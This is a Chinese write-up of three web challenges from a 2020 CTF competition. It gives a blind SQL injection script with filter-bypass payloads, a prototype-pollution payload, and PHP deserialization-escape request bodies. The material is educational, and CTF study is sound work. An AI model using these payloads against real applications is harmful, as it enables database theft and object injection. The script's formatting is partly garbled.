本文首发于“合天智汇”公众号 作者：HhhM

web1

输入1点击输入框后会显示如下参数：

?id=1&limit=1

看下源码能得到这么两句sql语句：

<!-- $query = "SELECT * FROM fake_flag WHERE id = $id limit 0,$limit";
//$query = "SELECT flag FROM real_flag WHERE id = $id limit 0,$limit"; \-->

会发现左右过滤不相同，尝试如下可以把limit语句注释掉：

id=1/*&limit=*/

此时sql语句变成：

SELECT * FROM fake_flag WHERE id = 1/* limit 0,*/可控内容

空格被过滤了，可以考虑\t或\n来绕过，因此输入如下会发现语句执行成功：

?id=-1/*&limit=1*/or%0a1

or 1=1发现等于号被过滤，fuzz一下能得到部分可用函数，且左边没有过滤减号：

ord mid group_concat

过滤逗号可以采用from(1)for(1)的形式来绕过。

盲注脚本：

# conding=utf-8# ciscn2020 web1 blindimportrequests req =requests.session()url
="http://ip:port/?id={0}&limit={1}"defcommonGET():payload1
="-1\tor\t{0}-/*"payload2
="1*/ord(mid((select\tgroup_concat(flag)\tfrom(real_flag))from({0})for(1)))"chars
='-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz{}_!@#$%^&*()'result
=""fori inrange(1,50):forj inchars:payload3 =payload1.format(ord(j))payload4
=payload2.format(i)url1 =url.format(payload3,payload4)rep =req.get(url1)text
=rep.text # print(text)if"searched nothing"intext:result +=j
print(result)commonGET()

web2

比赛没咋看这个题，源码只存了个app.js跑不起来就没复现，大概看了一下是原型链污染。

player是一个字典，注意到:![](https://image.3001.net/images/20201027/1603783004_5f97c95c415076c18acf1.png!small)

因为monster也是一个字典，且存在hp，并且我们是先攻击怪兽，因此我们污染buff的话就可以一刀秒了boss，然后就是用这一个循环进行污染：![](https://image.3001.net/images/20201027/1603783018_5f97c96a7b37c69cbf73e.png!small)

传入：

{“__proto__“:{“buff”: 1000}}

那么就会把玩家的buff污染为1000，那么看到伤害的计算：![](https://image.3001.net/images/20201027/1603783028_5f97c974ebfabf593c641.png!small)

攻击+buff，也就是说这里就可以让玩家攻击无限大直接秒了boss了。

本地测试可以发现如下：![](https://image.3001.net/images/20201027/1603783037_5f97c97d948b167afdfa2.png!small)

打败boss即可getflag。

web3

Web3其实考了两个点一个是反序列化逃逸，一个是反序列化串中的s替换为S时可以把字符串用16进制表示，个人感觉这个题其实就是0ctfpiapiapia+强网杯2020的web辅助。

wwwroot.zip源码泄露。

给了一个user类，逃逸点在于：

privatefunctionwaf($string){$waf='/phar|file|gopher|http|sftp|flag/i';returnpreg_replace($waf,'index',$string);}

至于从哪里进行序列化串的传入，看到：![](https://image.3001.net/images/20201027/1603783046_5f97c98680f3e3f1f38fd.png!small)

先说我们传入的虽然是一个数组，
但因为waf处如果我们传入一个flag，就会被替换为index，此时长度差为1。![](https://image.3001.net/images/20201027/1603783055_5f97c98f36746b7ef1441.png!small)

在这里会把我们的序列化串waf后再反序列化，我们利用它可以逃逸出来一个user对象。![](https://image.3001.net/images/20201027/1603783063_5f97c997e2e0509b1c31c.png!small)

waf的话可以使用s替换为S以此使用16进制来表示flag.php来绕过，这一个过滤限制了我们只能使用old_password字段，否则的话可以采用gopher替换为index来吃掉部分序列化串。![](https://image.3001.net/images/20201027/1603783071_5f97c99fda9917caca00a.png!small)

需要伪造的序列化串为这么一串东西，长度为196，所以这里需要196个flag替换为index：![](https://image.3001.net/images/20201027/1603783080_5f97c9a8068fa002fcbcb.png!small)

本地模拟一下过waf会发现这里长度980其实就是index的长度总和：![](https://image.3001.net/images/20201027/1603783089_5f97c9b11a1bf9237e4db.png!small)

那么余下的序列化串理所当然就逃逸出去了。

update_username=1&old_password=flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag";s:1:"1";O:4:"User":6:{S:8:"username";s:1:"1";S:8:"password";s:1:"1";s:3:"age";s:1:"1";s:5:"email";s:1:"1";S:12:"\00User\00avatar";S:8:"\66\6C\61\67\2E\70\68\70";S:13:"\00User\00content";s:0:"";}&update_password=123&update_age=1&update_email=231@qq.com

当然了如果没有前面对字段的格式过滤，也可以采用如下的payload：

update_username=1&old_password=1&update_password=1&update_email=";s:5:"email";'.'O:4:"User":6:{S:8:"username";s:1:"1";S:8:"password";s:1:"1";s:3:"age";s:1:"1";s:5:"email";s:1:"1";S:12:"\00User\00avatar";S:8:"\66\6C\61\67\2E\70\68\70";S:13:"\00User\00content";s:0:"";}&update_age=gophergophergophergophergophergophergophergophergophergophergophergophergophergophergophergophergophergophergophergophergopher

